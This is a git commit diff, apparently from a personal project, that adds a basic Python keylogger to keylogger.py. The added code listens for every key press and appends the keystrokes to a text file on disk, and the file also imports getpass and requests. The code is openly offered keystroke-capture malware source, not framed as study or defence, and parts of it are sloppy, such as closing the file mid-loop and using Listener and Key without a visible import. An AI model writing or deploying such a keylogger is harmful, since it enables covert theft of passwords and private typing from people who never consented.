cc44d2a44d2732d37d4952063fcf582d9c6010aa
get-D <divyatwa5@gmail.com>
2026-01-28 00:39:14 +0530

    creating a basic keylogger

--- keylogger.py
+++ keylogger.py
@@ -32,3 +32,48 @@ import os
 
 import getpass
 from requests import get
+
+# creating keylogger
+key_info = "key_log.txt"
+
+file_path = "C:\\me\\python"
+extend = "\\"
+
+count = 0
+keys = []
+
+def on_press(key):
+    global keys, count 
+
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
+
+def write_file(keys):
+    with open(file_path + extend + key_info, "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write("\n")
+                f.close()
+
+            elif k.find("key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    try:
+        if key == Key.esc:
+            return False
+    
+    except AttributeError:
+        pass
+    
+with Listener(on_press= on_press, on_release= on_release) as listner:
+    listner.join()
+
